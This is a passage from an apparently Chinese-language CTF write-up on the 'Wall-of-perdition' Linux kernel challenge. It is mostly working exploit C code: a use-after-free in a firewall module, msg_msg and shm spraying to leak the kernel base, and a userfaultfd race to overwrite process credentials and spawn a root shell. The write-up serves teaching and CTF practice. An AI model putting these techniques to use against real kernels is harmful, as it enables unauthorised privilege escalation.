</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> s = </span><span style="color:#8fa1b3;">pthread_create</span><span style="color:#c0c5ce;">(&amp;thr, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, handler, (</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)uffd); </span><span style="color:#65737e;">// handler函数进行访存错误处理
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(s!=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] pthread_create</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/firewall</span><span style="color:#c0c5ce;">&quot;, O_RDONLY);   
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buffer[</span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">], received[</span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(buffer, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(buffer));
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(received, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(received));
</span><span style="color:#c0c5ce;">    msg *message = (msg *)buffer;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> qid, size;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(buffer, </span><span style="color:#d08770;">0x41</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i=</span><span style="color:#d08770;">0x50</span><span style="color:#c0c5ce;">; i&lt;</span><span style="color:#d08770;">0x54</span><span style="color:#c0c5ce;">; i++)
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">add</span><span style="color:#c0c5ce;">(i, buffer, INBOUND);    </span><span style="color:#65737e;">// rule 0x50 - 0x54
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, buffer, INBOUND);        </span><span style="color:#65737e;">// rule 0
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">duplicate</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, INBOUND);
</span><span style="color:#c0c5ce;">    qid = </span><span style="color:#8fa1b3;">msgget</span><span style="color:#c0c5ce;">(IPC_PRIVATE, </span><span style="color:#d08770;">0666 </span><span style="color:#c0c5ce;">| IPC_CREAT); </span><span style="color:#65737e;">// 创建消息
</span><span style="color:#c0c5ce;">    
</span><span style="color:#65737e;">// 1. leak kbase
</span><span style="color:#65737e;">// 1-1. OOB read leak setup: construct UAF kmalloc-4096
</span><span style="color:#c0c5ce;">    size = </span><span style="color:#d08770;">0x1010</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    message-&gt;mtype = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(message-&gt;mtext, </span><span style="color:#d08770;">0x41</span><span style="color:#c0c5ce;">, size);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">delete</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, INBOUND);     </span><span style="color:#65737e;">// trigger UAF
</span><span style="color:#65737e;">// 1-2. use msg_msg to take up the freed chunk
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">msgsnd</span><span style="color:#c0c5ce;">(qid, message, size-</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);   </span><span style="color:#65737e;">// kmalloc-4096 + kmalloc-32
</span><span style="color:#65737e;">// 1-3. spray shm_file_data struct after msg_msgseg
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> shmid;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*shmaddr;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i&lt;</span><span style="color:#d08770;">0x50</span><span style="color:#c0c5ce;">; i++)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((shmid = </span><span style="color:#8fa1b3;">shmget</span><span style="color:#c0c5ce;">(IPC_PRIVATE, </span><span style="color:#d08770;">100</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0600</span><span style="color:#c0c5ce;">)) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">shmget error</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        shmaddr = </span><span style="color:#8fa1b3;">shmat</span><span style="color:#c0c5ce;">(shmid, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(shmaddr == (</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">shmat error</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#65737e;">// 1-4. change msg_msg-&gt;m_ts bigger
</span><span style="color:#c0c5ce;">    msg_header evil;
</span><span style="color:#c0c5ce;">    size = </span><span style="color:#d08770;">0x1400</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;evil, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(msg_header));
</span><span style="color:#c0c5ce;">    evil.</span><span style="color:#bf616a;">ll_next </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)</span><span style="color:#d08770;">0x4141414141414141</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    evil.</span><span style="color:#bf616a;">ll_prev </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)</span><span style="color:#d08770;">0x4242424242424242</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    evil.</span><span style="color:#bf616a;">m_type </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    evil.</span><span style="color:#bf616a;">m_ts </span><span style="color:#c0c5ce;">= size;   </span><span style="color:#65737e;">// 0x1010 -&gt; 0x1400 : OOB read
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(buffer, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(buffer));
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(buffer, &amp;evil, </span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, buffer, OUTBOUND, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">// 1-5. leak shm_file_data-&gt;ns
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">msgrcv</span><span style="color:#c0c5ce;">(qid, received, size, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i&lt;size/</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">; i++)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((*(uint64_t *)(received + i*</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">) &amp; </span><span style="color:#d08770;">0xfff</span><span style="color:#c0c5ce;">) == </span><span style="color:#d08770;">0x7a0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        {
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] init_ipc_ns offset at </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, i*</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            init_ipc_ns = *(uint64_t *)(received + i*</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    kbase = init_ipc_ns - (</span><span style="color:#d08770;">0xffffffff81c3d7a0 </span><span style="color:#c0c5ce;">- </span><span style="color:#d08770;">0xffffffff81000000</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    init_task = kbase + (</span><span style="color:#d08770;">0xffffffff81c124c0 </span><span style="color:#c0c5ce;">- </span><span style="color:#d08770;">0xffffffff81000000</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    init_cred = kbase + (</span><span style="color:#d08770;">0xffffffff81c33060 </span><span style="color:#c0c5ce;">- </span><span style="color:#d08770;">0xffffffff81000000</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] init_ipc_ns: 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, init_ipc_ns);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] kbase: 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, kbase);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] init_task: 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, init_task);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] init_cred: 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, init_cred);
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">// 2. use arb read to traverse task_struct-&gt;tasks (at 0x298), find current task_struct via task_struct-&gt;pid (at 0x398) 
</span><span style="color:#c0c5ce;">    int32_t pid, cur_pid;
</span><span style="color:#c0c5ce;">    int64_t prev, curr;
</span><span style="color:#c0c5ce;">    cur_pid = </span><span style="color:#8fa1b3;">getpid</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">current pid:</span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, cur_pid);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    prev = (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)init_task + </span><span style="color:#d08770;">0x298</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(pid != cur_pid)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        curr = prev - </span><span style="color:#d08770;">0x298</span><span style="color:#c0c5ce;">;                    </span><span style="color:#65737e;">// current task_struct address
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;evil, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(msg_header));
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(received, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(received));
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(buffer, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(buffer));
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// get task_struct-&gt;tasks.prev pointer and task_struct-&gt;pid
</span><span style="color:#c0c5ce;">        evil.</span><span style="color:#bf616a;">m_type </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        evil.</span><span style="color:#bf616a;">m_ts </span><span style="color:#c0c5ce;">= size;                       </span><span style="color:#65737e;">// size = 0x1400
</span><span style="color:#c0c5ce;">        evil.</span><span style="color:#bf616a;">next </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)prev -</span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">;          </span><span style="color:#65737e;">// 1 null qword beforehand to avoid crash
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(buffer, (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;evil, sizeof(msg_header));
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, buffer, OUTBOUND, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">); 
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">msgrcv</span><span style="color:#c0c5ce;">(qid, received, size, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;prev, (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)(received + </span><span style="color:#d08770;">0xfe0</span><span style="color:#c0c5ce;">), </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);       </span><span style="color:#65737e;">// 0xfd0 + 0x10        msg_msgseg: null + tasks.next + tasks.prev
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;pid, (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)(received + </span><span style="color:#d08770;">0x10d8</span><span style="color:#c0c5ce;">), </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">);       </span><span style="color:#65737e;">// 0xfd0 + 0x8 + (0x398 - 0x298)
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, pid);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] found current task struct: 0x</span><span style="color:#d08770;">%llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, curr);
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">// 3. use arb write to change current_task&#39;s real_cred and cred
</span><span style="color:#65737e;">// 3-1. UAF for arb write
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">add</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, buffer, INBOUND);        </span><span style="color:#65737e;">// rule 1
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">duplicate</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, INBOUND);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">delete</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, INBOUND);
</span><span style="color:#65737e;">// 3-2. change real_cred and cred
</span><span style="color:#c0c5ce;">    page_size = </span><span style="color:#8fa1b3;">sysconf</span><span style="color:#c0c5ce;">(_SC_PAGE_SIZE);
</span><span style="color:#c0c5ce;">    msg *rooter;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*evil_page = </span><span style="color:#8fa1b3;">mmap</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">*page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    race_page = evil_page + </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    rooter = (msg *)(race_page - </span><span style="color:#d08770;">0x28</span><span style="color:#c0c5ce;">);          </span><span style="color:#65737e;">// cause fault page at race_page; 0x0-0x8: *next, 0x8+ msgseg
</span><span style="color:#c0c5ce;">    rooter-&gt;mtype = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] &amp;race_page = </span><span style="color:#d08770;">%p</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, race_page);
</span><span style="color:#c0c5ce;">    
</span><span style="color:#c0c5ce;">    size = </span><span style="color:#d08770;">0x1010</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    target_idx = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    target_addr = curr + </span><span style="color:#d08770;">0x538 </span><span style="color:#c0c5ce;">- </span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">;           </span><span style="color:#65737e;">// 1 null qword beforehand to avoid crash
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">register_userfault</span><span style="color:#c0c5ce;">(race_page, </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">msgsnd</span><span style="color:#c0c5ce;">(qid, rooter, size - </span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);        </span><span style="color:#65737e;">// memory layout:   0xfd0 + 0x10  -&gt;  kmalloc-4096 + kmalloc-32
</span><span style="color:#c0c5ce;">    
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">uid: </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#8fa1b3;">getuid</span><span style="color:#c0c5ce;">());
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">}
</span></pre>
<h1 id="wall-of-perdition">Wall-of-perdition</h1><h2 id="difference">Difference</h2><p>和上一题的源码是一样的，区别在于UAF的对象<code>rule_t</code>大小发生变化（Hard mode下没有<code>desc[DESC_MAX]</code>），变成了0x30，属于kmalloc-64</p>
<h2 id="lou-dong-li-yong">漏洞利用</h2><h3 id="yue-jie-du-xie-lu-nei-he-ji-zhi">越界读泄露内核基址</h3><p>创建两个消息队列</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">[...]
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">send_msg</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">qid</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">size</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">c</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">msgbuf
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">long</span><span style="color:#c0c5ce;"> mtype;
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> mtext[size - </span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    } msg;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    msg.</span><span style="color:#bf616a;">mtype </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(msg.</span><span style="color:#bf616a;">mtext</span><span style="color:#c0c5ce;">, c, sizeof(msg.</span><span style="color:#bf616a;">mtext</span><span style="color:#c0c5ce;">));
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">msgsnd</span><span style="color:#c0c5ce;">(qid, &amp;msg, sizeof(msg.</span><span style="color:#bf616a;">mtext</span><span style="color:#c0c5ce;">), </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgsnd</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">[...]
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">// [1] 创建两个消息队列
</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((qid[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = </span><span style="color:#8fa1b3;">msgget</span><span style="color:#c0c5ce;">(IPC_PRIVATE, </span><span style="color:#d08770;">0666 </span><span style="color:#c0c5ce;">| IPC_CREAT)) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgget</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((qid[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">] = </span><span style="color:#8fa1b3;">msgget</span><span style="color:#c0c5ce;">(IPC_PRIVATE, </span><span style="color:#d08770;">0666 </span><span style="color:#c0c5ce;">| IPC_CREAT)) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">msgget</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">// [2] 触发UAF
</span><span style="color:#8fa1b3;">add_rule</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, buff, INBOUND);
</span><span style="color:#8fa1b3;">duplicate_rule</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, INBOUND);
</span><span style="color:#8fa1b3;">delete_rule</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, INBOUND);
</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">send_msg</span><span style="color:#c0c5ce;">(qid[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">, &#39;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&#39;); </span><span style="color:#65737e;">// [3] 存占位
</span><span style="color:#8fa1b3;">send_msg</span><span style="color:#c0c5ce;">(qid[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">0x40</span><span style="color:#c0c5ce;">, &#39;</span><span style="color:#a3be8c;">B</span><span style="color:#c0c5ce;">&#39;); </span><span style="color:#65737e;">// [4]
</span><span style="color:#8fa1b3;">send_msg</span><span style="color:#c0c5ce;">(qid[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">0x1ff8</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">); </span><span style="color:#65737e;">// [5]
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">[...]
</span></pre>
<p>利用UAF<code>qid[0]</code>对应msg占位<code>rule_t</code>结构体的内存</p>
<p><img src="https://md.buptmerak.cn/uploads/91e65bc1-0419-4734-90ff-2ddc043ae3fc.png" alt="" /></p>
<p><img src="https://md.buptmerak.cn/uploads/95c53b45-9fa7-4ebe-a9a4-46de9574d632.png" alt="" /></p>
<p><img src="https://md.buptmerak.cn/uploads/41ab81e4-9d09-43d7-895e-fcebe5e06e74.png" alt="" /></p>
<p>也即下图所示，<code>qid[1]</code>消息队列中两条消息使用双向链表链接，同时<code>qid[1]</code>的第一条消息将位于<code>qid[0]</code>的正下方（有概率）</p>
<p><img src="https://md.buptmerak.cn/uploads/26e3df0e-000a-41eb-8060-9697f8c35b92.png" alt="" /></p>
